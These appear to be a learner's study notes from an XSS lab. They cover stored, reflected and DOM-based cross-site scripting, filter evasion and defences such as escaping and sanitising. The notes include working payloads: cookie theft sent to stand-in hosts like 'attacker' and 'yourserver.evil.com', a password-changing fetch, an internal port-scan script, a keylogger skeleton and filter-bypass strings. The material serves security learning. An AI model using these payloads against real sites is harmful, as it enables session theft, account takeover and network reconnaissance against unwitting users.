Introduction
	-> Cross-site scripting (XSS) is a security vulnerability typically found 
		in web applications. Its a type of injection which can allow an attacker 
		to execute malicious scripts and have it execute on a victims machine.
	-> A web application is vulnerable to XSS if it uses unsanitized user input.
	 	XSS is possible in Javascript, VBScript, Flash and CSS.
	-> The extent to the severity of this vulnerability depends on the type of 
		XSS, which is normally split into two categories: persistent/stored 
		and reflected.
	-> Depending on which, the following attacks are possible:
		1. Cookie stealing
		2. keylogging
		3. Webcam snapshot
		4. Phishing
		5. Port Scanning
		6. Other browser based exploits.


Stored XSS
	-> Stored cross-site scripting is the most dangerous type of XSS. This 
		is where a malicious string originates from the websites database. 
	-> This often happens when a website allows user input that is not 
		sanitised (remove the "bad parts" of a users input) when inserted 
		into the database.  
	-> A attacker creates a payload in a field when signing up to a website 
		that is stored in the websites database.
	-> If the website doesn't properly sanitise that field, when the site 
		displays that field on the page, it will execute the payload to 
		everyone who visits it. 
	-> The payload could be as simple as <script>alert(1)</script>

	Notes for deployed instance:
		-> <script>document.getElementById("thm-title").innerHTML = "I am a hacker";</script>

	-> Stored XSS can be used to steal a victims cookie. This can be done by having a 
		victims browser parse the following Javascript code:
		<script>window.location='http://attacker/?cookie='+document.cookie</script>
	-> You can also use other HTML tags to make requests, including the img tag
	<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />


Reflected XSS
	-> In a reflected cross-site scripting attack, the malicious payload is part of the 
		victims request to the website. The website includes this payload in response 
		back to the user.
	-> To summarise, an attacker needs to trick a victim into clicking a URL to execute 
		their malicious payload.
	-> 	An attacker crafts a URL containing a malicious payload and sends it to the victim.
	-> The victim is tricked by the attacker into clicking the URL.
	-> The request could be http://example.com/search?keyword=<script>...</script>
	Notes: <script>alert(window.location.hostname);</script>
	Notes: <script>fetch('/settings?new_password=pass123');</script>
		-> fetch command makes a network request to the specified url


DOM-based XSS
	-> DOM stands for Document Object Model and is a programming interface for HTML 
		and XML documents. 
	-> It represents the page so that programs can change the document structure, 
		style and content.
	-> A web page is a document and this document can be either displayed in the 
		browser window or as the HTML source.
	-> In a DOM-based XSS attack, a malicious payload is not actually 
		parsed by the victim's browser until the website's legitimate 
		JavaScript is executed. 
	-> With reflective xss, an attackers payload will be injected directly 
		on the website and will not matter when other Javascript on the site 
		gets loaded.
	<html>
    You searched for <em><script>...</script></em>
	</html 
	-> With DOM-Based xss, an attackers payload will only be executed 
		when the vulnerable Javascript code is either loaded or interacted 
		with. It goes through a Javascript function like so:
		var keyword = document.querySelector('#search')
		keyword.innerHTML = <script>...</script>

	Notes:
		test" onmouseover="alert(document.cookie);"
		test" onmouseover="document.body.style.backgroundColor ='orange'"


Using XSS for IP and Port Scanning:
	-> On the application layer your browser has no notion of internal and external IP addresses. So any website is able to tell your browser to request a resource from your internal network.
	-> For example, a website could try to find if your router has a web interface at 192.168.0.1 by:

<img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">
	-> The following script will scan an internal network in the range 192.168.0.0 to 192.168.0.255
	 <script>
		for (let i = 0; i < 256; i++) { // This is looping from 0 to 255
				let ip = '192.168.0.' + i // Creates variable for forming IP
				// Creating an image element, if the resource can load, it logs to the /logs page.
				let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
				document.body.innerHTML += code // This is adding the image element to the webpage
			}
	</script> 

XSS keylogger
	-> Javascript can be used for many things, including creating an event to listen for keypresses.
<script type="text/javascript">
		let l = ""; // Variable to store key-strokes in
		document.onkeypress = function (e) { // Event to listen for key presses
			l += e.key; // If user types, log it to the l variable
			console.log(l); // update this line to post to your own server
		}
</script>

Filter Evasion
	-> Are you able to bypass the filter that removes any script tags?
		Ans: <img src="blah" onerror=alert("Hello") />
	-> The word alert is filtered.
		<img src="blah" onerror=confirm("Hello") />
	-> The word hello is filtered, bypass it.
		<img src="blah" onerror=alert("HHelloello") />
	-> 
Filtered in challenge 4 is as follows:

    word "Hello"
    script
    onerror
    onsubmit
    onload
    onmouseover
    onfocus
    onmouseout
    onkeypress
    onchange

    Ans: <img src="blah" ONERROR="alert('HHelloello')" />

Protection MEthods:
	1. Escaping - Escape all user input. This means any data your application has received  is secure before rendering it for your end users. By escaping user input, key characters in the data received but the web page will be prevented from being interpreter in any malicious way. For example, you could disallow the < and > characters from being rendered.
	2. Validating Input - This is the process of ensuring your application is rendering the correct data and preventing malicious data from doing harm to your site, database and users. Input validation is disallowing certain characters from being submit in the first place.
	3. Sanitising - Lastly, sanitizing data is a strong defence but should not be used to battle XSS attacks alone. Sanitizing user input is especially helpful on sites that allow HTML markup, changing the unacceptable user input into an acceptable format. For example you could sanitise the < character into the HTML entity &#60;


Other Exploits:
	-> BeEF is a penetration testing tool that focuses on the web browser. The concept here is that you "hook" a browser (using XSS), then you are able to launch and control a range of different attacks.
	-> BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors.
	